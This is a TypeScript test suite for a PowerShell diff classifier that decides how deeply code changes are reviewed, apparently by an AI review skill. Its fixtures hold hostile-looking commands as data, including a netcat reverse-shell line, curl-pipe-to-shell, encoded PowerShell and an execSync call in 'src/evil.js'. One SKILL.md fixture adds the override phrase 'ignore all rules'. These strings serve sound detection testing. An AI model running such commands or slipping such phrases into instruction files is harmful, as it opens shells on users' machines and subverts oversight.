import { spawnSync } from 'child_process';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';

const SKILL = path.resolve(__dirname, '../../../packages/delivery/.apm/skills/review-fanout');
const SCRIPT = path.join(SKILL, 'scripts/Classify-Diff.ps1');
const REFERENCE = fs.readFileSync(path.join(SKILL, 'references/mechanical-classifier.md'), 'utf8');
const hasPwsh = spawnSync('pwsh', ['-NoProfile', '-Command', '1']).status === 0;

// The always-full destination list lives in the reference; parse it so docs and tests cannot drift.
const ALWAYS_FULL = (/Always-full rename destinations[^\n]*\n\n```text\n([\s\S]*?)\n```/.exec(REFERENCE)?.[1] ?? '')
  .split('\n')
  .filter(Boolean);

// Path triggers of $sensitive (reference "Dimensions"), each placed in an added docs file.
const SENSITIVE = [
  ...['auth', 'crypt', 'password', 'secret', 'token', 'oauth', 'login', 'http', 'network', 'socket', 'sql', 'query'],
  ...['database', 'jwt', 'session', 'cookie', 'permission', 'rbac', 'acl', 'cert', 'tls', 'ssl', 'cors', 'csrf'],
  ...['hash', 'apikey', 'api_key', 'hook', 'migration'],
]
  .map((w) => `docs/${w}-notes.md`)
  .concat(['docs/my-dockerfile.md', 'docs/prod.env-notes.md', 'docs/public/notes.md']);

if (!hasPwsh) console.warn('pwsh not found: skipping Classify-Diff.ps1 tests');

it.runIf(!hasPwsh && !!process.env.CI)('pwsh is installed in CI', () => {
  expect(hasPwsh).toBe(true);
});

it('reference documents the always-full destination list', () => {
  expect(ALWAYS_FULL.length).toBeGreaterThan(40);
  expect(ALWAYS_FULL).toEqual(expect.arrayContaining(['package.json', 'jest.config.js', '.eslintrc.js', 'src/index.js', 'vitest.config.ts']));
});

it('reference names the path triggers that the SENSITIVE fixtures exercise', () => {
  const dims = REFERENCE.slice(REFERENCE.indexOf('## Dimensions'));
  for (const w of ['auth', 'jwt', 'tls', 'migration', 'hook', 'Dockerfile', '`.env`', '`public/`']) expect(dims).toContain(w);
});

it('reference lists the executable-looking docs triggers', () => {
  const dims = REFERENCE.slice(REFERENCE.indexOf('## Dimensions'));
  for (const w of ['<script', 'import', 'require(', 'child_process', 'process.env', 'fs.write']) expect(dims).toContain(w);
});

type Result = { mode: string; dimensions: string[]; reason: string };

const hermetic = (home: string): NodeJS.ProcessEnv => {
  const env = { ...process.env };
  for (const k of Object.keys(env)) if (k.startsWith('GIT_') || k === 'XDG_CONFIG_HOME') delete env[k];
  return { ...env, HOME: home, GIT_CONFIG_NOSYSTEM: '1', GIT_CONFIG_GLOBAL: '/dev/null' };
};

const expectFull = (r: Result, reason?: RegExp) => {
  expect(r.mode).toBe('full');
  expect(r.dimensions).toEqual(['correctness', 'security', 'conventions', 'tests', 'spec']);
  if (reason) expect(r.reason).toMatch(reason);
};
const expectMech = (r: Result) => {
  expect(r.mode).toBe('mechanical');
  expect(r.dimensions).toEqual(['correctness', 'spec']);
  expect(r.reason).toMatch(/^only same-class renames/);
};
const expectMode = (r: Result, mode: string, dimensions: string[]) => {
  expect(r.mode).toBe(mode);
  expect(r.dimensions).toEqual(dimensions);
};
const expectDocs = (r: Result) => expectMode(r, 'docs', ['conventions', 'spec']);
const expectSec = (r: Result) => {
  expect(r.mode).toBe('mechanical');
  expect(r.dimensions).toEqual(['correctness', 'security', 'spec']);
};

const TEST_BASE = [
  'const oldName = (n: number) => n + 1;',
  'expect(oldName(1)).toBe(2);',
  "expect(label()).toBe('a');",
  'const first = second;',
  '',
].join('\n');

describe.skipIf(!hasPwsh)('Classify-Diff.ps1', { timeout: 30000 }, () => {
  let dir: string;
  let home: string;
  let runner: string;
  let caseNo = 0;
  const run = (cmd: string, args: string[]) => {
    const r = spawnSync(cmd, args, { cwd: dir, encoding: 'utf8', env: hermetic(home) });
    if (r.status !== 0) throw new Error(r.stderr);
    return r.stdout;
  };
  const git = (...args: string[]) => run('git', args);
  const write = (rel: string, content: string) => {
    fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
    fs.writeFileSync(path.join(dir, rel), content);
  };
  const read = (rel: string) => fs.readFileSync(path.join(dir, rel), 'utf8');
  const mv = (from: string, to: string) => {
    fs.mkdirSync(path.dirname(path.join(dir, to)), { recursive: true });
    git('mv', from, to);
  };
  const classify = (args: string[] = [], env: NodeJS.ProcessEnv = hermetic(home), cwd = dir): Result => {
    const r = spawnSync('pwsh', ['-NoProfile', '-File', SCRIPT, ...args], { cwd, encoding: 'utf8', env });
    expect(r.status).toBe(0);
    return JSON.parse(r.stdout);
  };
  const body = Array.from({ length: 30 }, (_, i) => `line ${i}`).join('\n') + '\n';
  const editFirst = (n: number) =>
    Array.from({ length: 30 }, (_, i) => (i < n ? `edited ${i}` : `line ${i}`)).join('\n') + '\n';

  // One fixture repo per file (tag `base`); every case starts from a hard reset to it.
  const reset = () => {
    git('checkout', '-qf', 'main');
    git('reset', '-q', '--hard', 'base');
    git('clean', '-qfdx');
  };

  // pwsh start-up dominates a single call, so most cases are batched: `batched()` registers one
  // beforeAll per describe that runs every case's setup on its own branch from `base`, commits it and
  // classifies all `<branch>~1..<branch>` ranges in ONE pwsh process. Each case is still its own test.
  const batched = () => {
    const setups: Array<() => void> = [];
    type Out = { exit: number; stderr: string; out: string };
    let outs: Out[] = [];
    const setupErrors: unknown[] = [];
    beforeAll(() => {
      reset();
      const ranges = setups.map((setup, i) => {
        const branch = `case-${++caseNo}`;
        git('checkout', '-qf', '-b', branch, 'base');
        try {
          setup();
          git('add', '-A');
          git('commit', '-qm', branch);
        } catch (e) {
          setupErrors[i] = e; // reported by this case's own test, not by the shared hook
        }
        return `${branch}~1..${branch}`;
      });
      reset();
      const r = spawnSync('pwsh', ['-NoProfile', '-File', runner, SCRIPT, ...ranges], { cwd: dir, encoding: 'utf8', env: hermetic(home) });
      expect(r.status).toBe(0);
      outs = r.stdout.trim().split('\n').map((l) => JSON.parse(l) as Out);
      expect(outs).toHaveLength(ranges.length);
    }, 60000);
    return (name: string, setup: () => void, check: (r: Result) => void) => {
      const i = setups.push(setup) - 1;
      it(name, () => {
        if (setupErrors[i]) throw setupErrors[i];
        expect({ exit: outs[i].exit, stderr: outs[i].stderr }).toEqual({ exit: 0, stderr: '' });
        check(JSON.parse(outs[i].out) as Result);
      });
    };
  };

  beforeAll(() => {
    home = fs.mkdtempSync(path.join(os.tmpdir(), 'classify-home-'));
    runner = path.join(home, 'run-many.ps1');
    fs.writeFileSync(runner, [
        'param([string]$Script)',
        'foreach ($r in $args) {',
        '  $global:LASTEXITCODE = $null',
        '  $err = @(); $o = & $Script -Range $r 2>&1 | ForEach-Object { if ($_ -is [System.Management.Automation.ErrorRecord]) { $err += "$_" } else { $_ } }',
        '  @{ exit = $LASTEXITCODE; stderr = ($err -join "`n"); out = (@($o) -join "`n") } | ConvertTo-Json -Compress',
        '}',
        '',
      ].join('\n'));
    dir = fs.mkdtempSync(path.join(os.tmpdir(), 'classify-'));
    git('init', '-q', '-b', 'main');
    git('config', 'user.email', 't@t');
    git('config', 'user.name', 't');
    git('config', 'commit.gpgsign', 'false');
    write('old/tool.ts', body);
    write('docs/guide.md', body);
    write('docs/auth.md', body);
    write('src/app.ts', body);
    write('src/evil.js', 'require("child_process").execSync("id");\n');
    write('src/app.test.ts', TEST_BASE);
    write('package.json', '{\n  "scripts": {}\n}\n');
    write('requirements.txt', 'requests==1.0\n');
    write('packages/x/.apm/skills/foo/SKILL.md', body);
    write('packages/x/.apm/skills/foo/references/a.md', 'reference a\n');
    write('docs/tool.sh', body);
    write('README.md', body);
    write('CONTRIBUTING.md', body);
    write('CHANGELOG.md', body);
    write('memo/plan.md', body);
    write('apm.yml', 'name: x\n');
    write('marketplace.json', '{\n  "plugins": []\n}\n');
    write('.claude-plugin/plugin.json', '{\n  "name": "x"\n}\n');
    write('docs/my guide.md', body);
    write('src/crlf.test.ts', 'const oldName = 1;\r\nexpect(oldName).toBe(1);\r\n');
    write('src/ctx.test.ts', 'let old = 1;\nfoo(old);\nbar(old);\n');
    write('src/b.test.ts', 'const a = 1;\nconst b = 2;\nexpect(a(b));\n');
    write('src/cm.test.ts', '// note\n/** doc */\nconst `x` = 1;\nlet s = "a"; let t = `a${s}`;\n');
    write('src/m.test.ts', 'const r = f();\nexpect(r).toEqual(2);\n');
    write('a.json', '{}\n');
    write('a.toml', 'x = 1\n');
    write('x.yml', 'on: push\n');
    write('notes', 'notes\n');
    write('lib.js', 'module.exports = 1;\n');
    write('lib2.py', 'X = 1\n');
    git('add', '.');
    git('commit', '-qm', 'base');
    git('tag', 'base');
  }, 60000);
  afterAll(() => {
    if (dir) fs.rmSync(dir, { recursive: true, force: true });
    if (home) fs.rmSync(home, { recursive: true, force: true });
  });
  beforeEach(reset);

  describe('renames by location class', () => {
    const batch = batched();

    batch('same-class source rename is mechanical with correctness and spec', () => git('mv', 'old', 'new'), expectMech);

    batch('pure docs rename to another file name is mechanical', () => mv('docs/guide.md', 'docs/other.md'), expectMech);

    batch('basename-preserving directory move of an other file is mechanical', () => mv('a.json', 'config/a.json'), expectMech);

    batch(
      'package-directory rename with SKILL.md, scripts, references, apm.yml entry and doc mention is mechanical (#178)',
      () => {
        const pkg = 'packages/development-workflow';
        write(`${pkg}/apm.yml`, 'name: development-workflow\ndescription: workflow skills for delivery\nversion: 1.0.0\nlicense: MIT\nskills:\n  - flow\n');
        write(`${pkg}/.apm/skills/flow/SKILL.md`, '---\nname: flow\n---\nRun the flow.\n');
        write(`${pkg}/.apm/skills/flow/scripts/Run-Flow.ps1`, 'Write-Output "flow"\n');
        write(`${pkg}/.apm/skills/flow/references/steps.md`, 'Step one, step two.\n');
        write('apm.yml', 'name: x\npackages:\n  - packages/development-workflow\n');
        write('docs/guide.md', body.replace('line 3', 'see development-workflow'));
        git('add', '-A');
        git('commit', '-qm', 'pkg');
        git('mv', pkg, 'packages/delivery');
        write('packages/delivery/apm.yml', read('packages/delivery/apm.yml').replace('development-workflow', 'delivery'));
        write('apm.yml', read('apm.yml').replace('development-workflow', 'delivery'));
        write('docs/guide.md', read('docs/guide.md').replace('development-workflow', 'delivery'));
        git('add', '-A');
        const status = git('diff', '--cached', '-M', '--name-status');
        expect(status).toMatch(/^R100\tpackages\/development-workflow\/\.apm\/skills\/flow\/SKILL\.md\tpackages\/delivery\//m);
        expect(status).toMatch(/^R100\t[^\n]*scripts\/Run-Flow\.ps1/m);
      },
      (r) => {
        expectSec(r);
        expect(r.reason).toMatch(/^only same-class renames and \d+ changed lines/);
      },
    );

    for (const dest of ALWAYS_FULL) {
      batch(
        `pure rename src/evil.js -> ${dest} is full`,
        () => {
          if (fs.existsSync(path.join(dir, dest))) {
            git('rm', '-q', dest);
            git('commit', '-qm', 'free destination');
          }
          mv('src/evil.js', dest);
          expect(git('diff', '--cached', '-M', '--name-status')).toBe(`R100\tsrc/evil.js\t${dest}\n`);
        },
        (r) => expectFull(r, /rename changes location class \(source -> (exec|build|instruction):/),
      );
    }

    // Tool-loaded names outside the lists stay out of reach: a same-class rename keeps its file name.
    for (const [from, to, cls] of [
      ['a.json', 'composer.json', 'other'],
      ['lib.js', 'gulpfile.js', 'source'],
      ['lib2.py', 'fabfile.py', 'source'],
      ['lib.js', 'Gruntfile.js', 'source'],
      ['notes', 'Vagrantfile', 'other'],
      ['x.yml', 'lefthook.yml', 'other'],
      ['x.yml', 'action.yml', 'other'],
      ['lib2.py', 'tasks.py', 'source'],
      ['a.json', 'vercel.json', 'other'],
      ['a.toml', 'netlify.toml', 'other'],
      ['a.json', 'renovate.json', 'other'],
      ['a.toml', '.cargo/config.toml', 'other'],
      ['src/app.test.ts', 'src/app2.test.ts', 'test'],
    ]) {
      batch(
        `same-class rename ${from} -> ${to} that changes the file name is full`,
        () => mv(from, to),
        (r) => expectFull(r, new RegExp(`^${cls} file renamed to another file name \\(${cls} -> ${cls}: `)),
      );
    }

    // Git C-quotes such paths; unquoted they would be exec/build, quoted they look like `other`.
    for (const [from, to] of [
      ['a\tb.yml', '.github/workflows/a\tb.yml'],
      ['d\tx/package.json', 'e\ty/package.json'],
    ]) {
      batch(
        `rename between C-quoted paths ${JSON.stringify(from)} -> ${JSON.stringify(to)} is full`,
        () => {
          write(from, 'on: push\n');
          git('add', '-A');
          git('commit', '-qm', 'prep');
          mv(from, to);
        },
        (r) => expectFull(r, /^quoted path \(tab, newline, quote or backslash\): "/),
      );
    }

    for (const [from, to] of [
      ['.github/workflows/a.yml', '.github/workflows/b.yml'],
      ['package.json', 'sub/package.json'],
    ]) {
      batch(
        `same-class rename of an always-full path ${from} -> ${to} is full`,
        () => {
          if (!fs.existsSync(path.join(dir, from))) {
            write(from, 'on: push\n');
            git('add', '-A');
            git('commit', '-qm', 'prep');
          }
          mv(from, to);
        },
        (r) => expectFull(r, /rename of an always-full path/),
      );
    }

    batch(
      'skill reference renamed to SKILL.md is full',
      () => {
        git('rm', '-q', 'packages/x/.apm/skills/foo/SKILL.md');
        git('commit', '-qm', 'rm');
        git('mv', 'packages/x/.apm/skills/foo/references/a.md', 'packages/x/.apm/skills/foo/SKILL.md');
      },
      (r) => expectFull(r, /instruction file renamed to another file name/),
    );

    for (const [from, to, flow] of [
      ['docs/guide.md', 'AGENTS.md', /docs -> instruction/],
      ['packages/x/.apm/skills/foo/SKILL.md', 'notes.txt', /instruction -> other/],
      ['src/app.ts', 'src/app2.test.ts', /source -> test/],
    ] as const) {
      batch(
        `pure rename ${from} -> ${to} changes class and is full`,
        () => mv(from, to),
        (r) => {
          expectFull(r, /rename changes location class/);
          expect(r.reason).toMatch(flow);
        },
      );
    }

    batch(
      'rename with edits from code into docs is full',
      () => {
        git('mv', 'src/app.ts', 'docs/app.md');
        write('docs/app.md', body.replace('line 3', 'new name'));
      },
      (r) => expectFull(r, /rename with edits changes location class \(source -> docs/),
    );

    batch(
      'rename plus code change is full and git pairs it as a rename',
      () => {
        git('mv', 'old', 'new');
        write('new/tool.ts', body.replace('line 3', 'changed'));
        git('add', '-A');
        expect(git('diff', '--cached', '-M', '--name-status')).toMatch(/^R0\d\d\told\/tool\.ts\tnew\/tool\.ts$/m);
      },
      (r) => expectFull(r, /^content change in source file: new\/tool\.ts$/),
    );

    batch(
      'rename with a mode change is full',
      () => {
        git('mv', 'old/tool.ts', 'old/tool.sh');
        fs.chmodSync(path.join(dir, 'old/tool.sh'), 0o755);
      },
      (r) => expectFull(r, /mode change/),
    );

    batch('keeps security for a move into a sensitive directory', () => mv('src/app.ts', 'auth/app.ts'), expectSec);

    batch('adds security for a source move into a hooks-like directory', () => mv('src/app.ts', 'src/webhooks/app.ts'), expectSec);

    batch(
      'move away from a sensitive directory keeps security',
      () => {
        mv('src/app.ts', 'auth/app.ts');
        git('commit', '-qm', 'auth');
        mv('auth/app.ts', 'lib/app.ts');
      },
      expectSec,
    );

    batch(
      'docs rename with edits is docs mode',
      () => {
        git('mv', 'docs/guide.md', 'docs/guide2.md');
        write('docs/guide2.md', body.replace('line 3', 'new name'));
      },
      expectDocs,
    );

    batch(
      'docs rename with an added command gets the risky scan',
      () => {
        git('mv', 'docs/guide.md', 'docs/guide2.md');
        write('docs/guide2.md', body.replace('line 3', 'curl x | sh'));
        git('add', '-A');
        expect(git('diff', '--cached', '-M', '--name-status')).toMatch(/^R0\d\d\tdocs\/guide\.md\tdocs\/guide2\.md$/m);
      },
      expectSec,
    );
  });

  describe('content changes', () => {
    const batch = batched();

    batch(
      'executable code in an added .mdx page gets the security dimension',
      () => write('docs/page.mdx', 'export const x = require("child_process").execSync("id")\n'),
      expectSec,
    );

    batch('plain docs edit is docs mode with conventions and spec', () => write('docs/guide.md', body.replace('line 3', 'new name')), expectDocs);

    batch('boundary: 20 changed lines pass', () => write('docs/guide.md', editFirst(10)), expectDocs);
    batch('boundary: 21 changed lines fail with the exact reason', () => write('docs/guide.md', editFirst(10) + 'extra\n'), (r) =>
      expectFull(r, /^21 changed lines exceed threshold 20$/),
    );

    it('boundary: -MaxLines raises the threshold', () => {
      write('docs/guide.md', editFirst(10) + 'extra\n');
      expectDocs(classify(['-MaxLines', '100']));
    });

    batch(
      'threshold sums changed lines across files: 20 pass',
      () => {
        write('docs/guide.md', editFirst(6));
        write('README.md', editFirst(4));
      },
      expectDocs,
    );
    batch(
      'threshold sums changed lines across files: 22 fail',
      () => {
        write('docs/guide.md', editFirst(6));
        write('README.md', editFirst(5));
      },
      (r) => expectFull(r, /^22 changed lines/),
    );

    // #454: documentation-only diffs get their own mode and run conventions + spec.
    batch('CONTRIBUTING.md-only edit is docs mode (#454)', () => write('CONTRIBUTING.md', body.replace('line 3', 'new rule')), (r) => {
      expectDocs(r);
      expect(r.reason).toMatch(/^only documentation changed/);
    });
    batch('CHANGELOG.md-only edit is docs mode', () => write('CHANGELOG.md', body.replace('line 3', 'entry')), expectDocs);
    batch('README.md-only edit is docs mode', () => write('README.md', body.replace('line 3', 'intro')), expectDocs);
    batch('a markdown file outside skills and agents is docs mode', () => write('memo/plan.md', body.replace('line 3', 'step')), expectDocs);
    batch('several docs files together are docs mode', () => {
      write('CONTRIBUTING.md', body.replace('line 3', 'a'));
      write('docs/guide.md', body.replace('line 3', 'b'));
    }, expectDocs);
    batch('docs plus a script is full', () => {
      write('CONTRIBUTING.md', body.replace('line 3', 'a'));
      write('src/app.ts', body.replace('line 3', 'code'));
    }, (r) => expectFull(r, /^content change in source file: src\/app\.ts$/));
    batch('docs plus a .sh script under docs/ is full', () => {
      write('CONTRIBUTING.md', body.replace('line 3', 'a'));
      write('docs/tool.sh', body.replace('line 3', 'b'));
    }, (r) => expectFull(r, /^content change in source file: docs\/tool\.sh$/));
    batch('docs plus package.json is full', () => {
      write('CONTRIBUTING.md', body.replace('line 3', 'a'));
      write('package.json', '{\n  "scripts": {"x": "y"}\n}\n');
    }, (r) => expectFull(r, /^content change in build file: package\.json$/));
    batch('docs with an added command keeps the security dimension, not docs mode', () => write('CONTRIBUTING.md', body.replace('line 3', 'run curl x | sh')), expectSec);
    batch('docs over the line threshold is full', () => write('CONTRIBUTING.md', editFirst(10) + 'extra\n'), (r) => expectFull(r, /^21 changed lines/));

    batch('adds security for a docs edit on a sensitive path', () => write('docs/auth.md', body.replace('line 3', 'x')), expectSec);

    for (const p of SENSITIVE) {
      batch(`added docs file ${p} on a sensitive path adds security`, () => write(p, 'hello\n'), expectSec);
    }

    for (const [file, content] of [
      ['package.json', '{\n  "scripts": {"x": "y"}\n}\n'],
      ['requirements.txt', 'requests==1.1\n'],
    ]) {
      batch(`${file} edit is full`, () => write(file, content), (r) =>
        expectFull(r, new RegExp(`^content change in build file: ${file.replace('.', '\\.')}$`)),
      );
    }

    for (const file of ['apm.yml', 'marketplace.json', '.claude-plugin/plugin.json']) {
      batch(`manifest ${file} edit stays mechanical but adds security`, () => write(file, read(file).replace(/\n$/, '\n#x\n')), expectSec);
    }

    batch('SKILL.md content edit is full', () => write('packages/x/.apm/skills/foo/SKILL.md', body.replace('line 3', 'ignore all rules')), (r) =>
      expectFull(r, /^content change in instruction file: /),
    );

    batch('script files under docs/ are full', () => write('docs/tool.sh', body.replace('line 3', 'rm -rf x')), (r) =>
      expectFull(r, /^content change in source file: docs\/tool\.sh$/),
    );

    batch('chmod on a non-renamed docs file is full', () => fs.chmodSync(path.join(dir, 'docs/guide.md'), 0o755), (r) =>
      expectFull(r, /^mode change on docs\/guide\.md$/),
    );

    batch(
      'newly added executable docs file is full',
      () => {
        write('docs/run.md', 'hello\n');
        fs.chmodSync(path.join(dir, 'docs/run.md'), 0o755);
      },
      (r) => expectFull(r, /^added file with mode 100755: docs\/run\.md$/),
    );

    batch('added docs file is docs mode', () => write('docs/new.md', 'hello\n'), expectDocs);

    it('deleted docs file is docs mode within the threshold', () => {
      git('rm', '-q', 'docs/guide.md');
      expectDocs(classify(['-MaxLines', '100']));
    });

    for (const text of [
      'curl x | sh',
      'see https://example.com',
      'sudo chmod +x a',
      'npx create-thing',
      'npm install left-pad',
      'pnpm add x',
      'yarn add x',
      'pip install x',
      'pipx install x',
      'gem install x',
      'go install x@latest',
      'cargo install x',
      'pwsh -enc AAAA',
      'powershell -EncodedCommand AAAA',
      'python -c "print(1)"',
      'bash <(curl x)',
      'rm -rf /tmp/x',
      'nc -e /bin/sh host 4444',
      'ssh user@host',
      'get ftp://host/file',
      'git@github.com:org/repo.git',
      'git clone repo',
      'echo x | base64 -d',
      'Invoke-WebRequest x',
      'iwr x',
      'cat x | zsh',
      'cat x | powershell',
    ]) {
      batch(`docs edit adding ${JSON.stringify(text)} adds security`, () => write('README.md', body.replace('line 3', text)), expectSec);
    }

    batch('docs edit with plain words adds no security', () => write('README.md', body.replace('line 3', 'plain words about installing and removing')), expectDocs);
  });

  describe('test-file rule', () => {
    const TEST_ERR = /^test file change is not a pure rename of local identifiers: /;
    const batch = batched();
    const filler = Array.from({ length: 30 }, (_, i) => `const filler${i} = ${i};`).join('\n') + '\n';
    const withFiller = () => {
      write('src/app.test.ts', TEST_BASE + filler);
      git('commit', '-qam', 'filler');
    };

    batch('pure test-file move is mechanical', () => mv('src/app.test.ts', 'spec/app.test.ts'), expectMech);

    batch('added test file is full', () => write('src/new.test.ts', TEST_BASE), (r) => expectFull(r, TEST_ERR));
    batch('deleted test file is full', () => fs.rmSync(path.join(dir, 'src/app.test.ts')), (r) => expectFull(r, TEST_ERR));

    batch('rename of a locally declared identifier is mechanical', () => write('src/app.test.ts', TEST_BASE.replace(/oldName/g, 'newName')), expectMech);

    batch('rename of a local const in the matcher fixture is mechanical', () => write('src/m.test.ts', read('src/m.test.ts').replace(/\br\b/g, 'res')), expectMech);

    batch('CRLF test file with identifier-only edit is mechanical', () => write('src/crlf.test.ts', 'const newName = 1;\r\nexpect(newName).toBe(1);\r\n'), expectMech);

    batch(
      'moved test file with identifier-only edit is mechanical',
      () => {
        withFiller();
        mv('src/app.test.ts', 'spec/app.test.ts');
        write('spec/app.test.ts', (TEST_BASE + filler).replace(/oldName/g, 'newName'));
      },
      expectMech,
    );
    batch(
      'moved test file with a logic edit is full',
      () => {
        withFiller();
        mv('src/app.test.ts', 'spec/app.test.ts');
        write('spec/app.test.ts', (TEST_BASE + filler).replace(/oldName/g, 'newName').replace('toBe(2)', 'toBe(3)'));
      },
      (r) => expectFull(r, TEST_ERR),
    );
    batch(
      'test file renamed with edits to another file name is full',
      () => {
        withFiller();
        mv('src/app.test.ts', 'spec/app2.test.ts');
        write('spec/app2.test.ts', (TEST_BASE + filler).replace(/oldName/g, 'newName'));
        git('add', '-A');
        expect(git('diff', '--cached', '-M', '--name-status')).toMatch(/^R0\d\d\tsrc\/app\.test\.ts\tspec\/app2\.test\.ts$/m);
      },
      (r) => expectFull(r, /^test file renamed to another file name \(test -> test: /),
    );

    // Added lines of test files get the risky scan (reference "Dimensions"): a local renamed onto a
    // command token passes the test-file rule and stays mechanical, but adds the security dimension.
    for (const name of ['curl', 'npx', 'base64']) {
      batch(`test-file rename r -> ${name} is mechanical with security`, () => write('src/m.test.ts', read('src/m.test.ts').replace(/\br\b/g, name)), (r) => {
        expectSec(r);
        expect(r.reason).toMatch(/^only same-class renames/);
      });
    }

    for (const [name, file, from, to] of [
      ['matcher swap toEqual -> toBeDefined', 'src/m.test.ts', 'toEqual', 'toBeDefined'],
      ['number change', 'src/app.test.ts', 'toBe(2)', 'toBe(3)'],
      ['keyword swap', 'src/app.test.ts', 'const first', 'let first'],
      ['string literal change', 'src/app.test.ts', "toBe('a')", "toBe('b')"],
      ['undeclared call target rename', 'src/app.test.ts', 'label()', 'other()'],
      ['non-injective self assignment', 'src/app.test.ts', 'const first = second;', 'const x = x;'],
      ['merge onto an existing name', 'src/app.test.ts', 'const first = second;', 'const second = second;'],
      ['merge onto an existing argument', 'src/b.test.ts', 'expect(a(b));', 'expect(b(b));'],
      ['old token surviving in a context line', 'src/ctx.test.ts', 'let old = 1;\nfoo(old);', 'let renamed = 1;\nfoo(renamed);'],
      ['pure deletion of a line', 'src/app.test.ts', "expect(label()).toBe('a');\n", ''],
      ['comment change', 'src/cm.test.ts', '// note', '// other'],
      ['JSDoc change', 'src/cm.test.ts', '/** doc */', '/** docs */'],
      ['double-quoted string change', 'src/cm.test.ts', '"a"', '"b"'],
      ['template string change', 'src/cm.test.ts', '`a${s}`', '`b${s}`'],
    ]) {
      batch(
        `${name} is full`,
        () => {
          const before = read(file);
          expect(before).toContain(from);
          write(file, before.replace(from, to));
        },
        (r) => expectFull(r, TEST_ERR),
      );
    }

    for (const name of ['NaN', 'Math', 'process', 'undefined', 'globalThis', 'require', 'self', 'toBe']) {
      batch(`local renamed to builtin or matcher ${name} is full`, () => write('src/m.test.ts', read('src/m.test.ts').replace(/\br\b/g, name)), (r) =>
        expectFull(r, TEST_ERR),
      );
    }

    for (const [name, content] of [
      ['named import', 'import { oldName } from "./app";\nexpect(oldName(1)).toBe(2);\n'],
      ['object destructuring', 'const { oldName } = mod;\nexpect(oldName(1)).toBe(2);\n'],
      ['member access', 'const oldName = 1;\nexpect(obj.oldName).toBe(oldName);\n'],
      ['optional member call', 'const oldName = 1;\nexpect(obj?.oldName()).toBe(oldName);\n'],
      ['object key', 'const oldName = 1;\nconst o = { oldName: 2 };\nexpect(o).toBe(oldName);\n'],
      ['shorthand property', 'const oldName = 1;\nexpect({ oldName }).toEqual(x);\n'],
      ['python keyword argument', 'def f(oldName):\n    return g(oldName=oldName)\n'],
    ]) {
      batch(
        `rename through a ${name} is full`,
        () => {
          write('src/k.test.ts', content);
          git('add', '-A');
          git('commit', '-qm', 'prep');
          write('src/k.test.ts', content.replace(/oldName/g, 'newName'));
        },
        (r) => expectFull(r, TEST_ERR),
      );
    }

    batch(
      'inconsistent rename is full',
      () => write('src/app.test.ts', TEST_BASE.replace('oldName(1)', 'other(1)').replace('const oldName', 'const newName')),
      (r) => expectFull(r, TEST_ERR),
    );

    batch('rename onto a name already used elsewhere is full', () => write('src/app.test.ts', TEST_BASE.replace(/oldName/g, 'first')), (r) => expectFull(r, TEST_ERR));

    batch('added assertion is full', () => write('src/app.test.ts', TEST_BASE + 'expect(1).toBe(1);\n'), (r) => expectFull(r, TEST_ERR));

    batch(
      'rename that makes an assertion tautological is full',
      () => {
        write('src/app.test.ts', 'const x = 1;\nconst expected = 1;\nexpect(x).toBe(expected);\n');
        git('commit', '-qam', 'prep');
        write('src/app.test.ts', 'const x = 1;\nconst x = 1;\nexpect(x).toBe(x);\n');
      },
      (r) => expectFull(r, TEST_ERR),
    );
  });

  describe('ranges, git state and failures', () => {
    const batch = batched();

    it('-Force full overrides a mechanical diff', () => {
      write('docs/guide.md', body.replace('line 3', 'x'));
      expectFull(classify(['-Force', 'full']), /forced/);
    });

    it('-Force full overrides a docs-only diff', () => {
      write('CONTRIBUTING.md', body.replace('line 3', 'x'));
      expectFull(classify(['-Force', 'full']), /forced/);
    });

    it('untracked files in working-tree mode are full', () => {
      write('docs/guide.md', body.replace('line 3', 'x'));
      write('src/evil.ts', 'x\n');
      expectFull(classify(), /untracked/);
    });

    it('working-tree mode classifies unstaged edits', () => {
      write('docs/guide.md', body.replace('line 3', 'x'));
      expectDocs(classify());
    });

    it('working-tree mode classifies a staged pure rename (no -Range)', () => {
      mv('docs/guide.md', 'docs/other.md');
      expect(git('diff', '--cached', '-M', '--name-status')).toBe('R100\tdocs/guide.md\tdocs/other.md\n');
      expectMech(classify());
    });

    it('explicit committed range is classified from that range', () => {
      write('docs/guide.md', body.replace('line 3', 'x'));
      git('commit', '-qam', 'docs');
      write('untracked.ts', 'x\n');
      expectDocs(classify(['-Range', 'HEAD~1..HEAD']));
      write('src/app.ts', body.replace('line 3', 'code'));
      git('commit', '-qam', 'code');
      expectFull(classify(['-Range', 'HEAD~2..HEAD']), /^content change in source file: src\/app\.ts$/);
    });

    it('three-dot range is classified', () => {
      write('docs/guide.md', body.replace('line 3', 'x'));
      git('commit', '-qam', 'docs');
      expectDocs(classify(['-Range', 'HEAD~1...HEAD']));
    });

    batch('path with spaces is handled', () => write('docs/my guide.md', body.replace('line 3', 'x')), expectDocs);

    it('empty diff fails closed to full', () => {
      expectFull(classify(), /empty/);
    });

    it('bad range fails closed to full', () => {
      expectFull(classify(['-Range', 'nope..alsonope']), /invalid range/);
    });

    it('range starting with a dash fails closed to full', () => {
      write('docs/guide.md', body.replace('line 3', 'x'));
      expectFull(classify(['-Range:--output=out.txt']), /invalid range/);
      expect(fs.existsSync(path.join(dir, 'out.txt'))).toBe(false);
    });

    batch('binary files fail closed to full', () => fs.writeFileSync(path.join(dir, 'docs/img.md'), Buffer.from([0, 1, 2, 0, 255])), (r) => expectFull(r, /binary/));

    batch('symlink is full', () => fs.symlinkSync('x', path.join(dir, 'docs/link.md')), (r) => expectFull(r, /^symlink or submodule: docs\/link\.md$/));

    // Not batched: `git add -A` would drop the gitlink, which has no working-tree directory.
    it('submodule is full', () => {
      git('update-index', '--add', '--cacheinfo', '160000,' + 'a'.repeat(40) + ',sub');
      git('commit', '-qm', 'sub');
      expectFull(classify(['-Range', 'HEAD~1..HEAD']), /^symlink or submodule: sub$/);
    });

    // Not batched: needs two commits. `ignore = all` must not hide the pointer bump.
    it('submodule pointer bump hidden by ignore = all next to a docs edit is full', () => {
      git('update-index', '--add', '--cacheinfo', '160000,' + 'a'.repeat(40) + ',sub');
      write('.gitmodules', '[submodule "sub"]\n\tpath = sub\n\turl = ../sub\n\tignore = all\n');
      git('add', '.gitmodules');
      git('commit', '-qm', 'sub');
      git('update-index', '--cacheinfo', '160000,' + 'b'.repeat(40) + ',sub');
      write('README.md', body.replace('line 3', 'x'));
      git('commit', '-qam', 'bump');
      expectFull(classify(['-Range', 'HEAD~1..HEAD']), /^symlink or submodule: sub$/);
    });

    batch(
      'type change from file to symlink is full',
      () => {
        fs.rmSync(path.join(dir, 'docs/guide.md'));
